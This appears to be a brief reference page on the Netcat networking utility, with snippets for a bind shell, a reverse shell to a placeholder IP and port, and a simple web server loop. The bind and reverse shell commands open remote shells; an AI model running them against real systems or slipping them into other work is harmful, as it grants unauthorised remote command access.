# Netcat

**Netcat** is a utility for networking over
[TCP](../../network/protocols/tcp.md) and [UDP](../../network/protocols/udp.md).
It similar to [Socat](./socat.md), albeit more simplistic and more often bundled
into distros by default. Note that there are several implementations of Netcat
and options between the different implementations may vary.

## Bind shell

One can create a simplistic bind shell with Netcat using the following command:

```
nc -lp 8080 -e /bin/bash
```

## Reverse shell

To initiate a reverse shell, run the following command:

```
nc <IP> <PORT> -e /bin/bash
```

## Web server

One can run a basic static file web server using the following (note that the
`-N` option is unique to the OpenBSD implementation):

```sh
while true; do printf 'HTTP/1.1 200 OK\n\n%s' "$(cat index.html)" | nc -l 80 -N; done
```
